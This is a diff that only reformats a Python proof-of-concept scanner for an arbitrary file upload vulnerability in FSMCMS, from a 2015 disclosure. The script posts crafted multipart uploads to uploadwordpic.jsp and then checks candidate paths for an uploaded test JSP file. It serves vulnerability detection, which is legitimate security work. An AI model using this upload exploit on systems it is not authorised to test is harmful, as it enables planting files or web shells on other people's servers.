@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'FSMCMS_0011' # 平台漏洞编号，留空
+    vuln_id = 'FSMCMS_0011'  # 平台漏洞编号，留空
     name = 'FSMCMS系统 任意文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-10-10'  # 漏洞公布时间
     desc = '''
         北京东方文辉FSMCMS
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     product = 'FSMCMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'e361121b-786e-4c8b-9cb3-007a0c9f80d1'
     author = '47bwy'  # POC编写者
@@ -34,8 +36,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Refer http://www.wooyun.org/bugs/wooyun-2015-0144292
+
+            # Refer http://www.wooyun.org/bugs/wooyun-2015-0144292
             hh = hackhttp.hackhttp()
             raw0 = '''
 POST /cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/ HTTP/1.1
@@ -109,7 +111,7 @@ Content-Disposition: form-data; name="Submit"
 -----------------------------171631986313562--
 
 '''
-            raws = [raw0,raw1,raw2]
+            raws = [raw0, raw1, raw2]
             shell_paths = [
                 '/cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/',
                 '/fsm/cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/',
@@ -123,13 +125,15 @@ Content-Disposition: form-data; name="Submit"
                 code1, head1, res1, errcode1, _url1 = hh.http(url, raw=raw)
                 # print url
                 # print raw
-                paths = ['/fsm/app/testvul.jsp', '/app/testvul.jsp', '/nlw/app/testvul.jsp']
+                paths = ['/fsm/app/testvul.jsp',
+                         '/app/testvul.jsp', '/nlw/app/testvul.jsp']
                 for path in paths:
                     final_shell_path = self.target + path
                     # print final_shell_path
-                    code2, head2, res2, errcode2, _url2 = hh.http(final_shell_path)
-                    if code2 == 200 and 'testvul_file_upload_test' in res2: 
-                        #security_hole(final_shell_path) 
+                    code2, head2, res2, errcode2, _url2 = hh.http(
+                        final_shell_path)
+                    if code2 == 200 and 'testvul_file_upload_test' in res2:
+                        # security_hole(final_shell_path)
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
 
@@ -138,6 +142,7 @@ Content-Disposition: form-data; name="Submit"
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
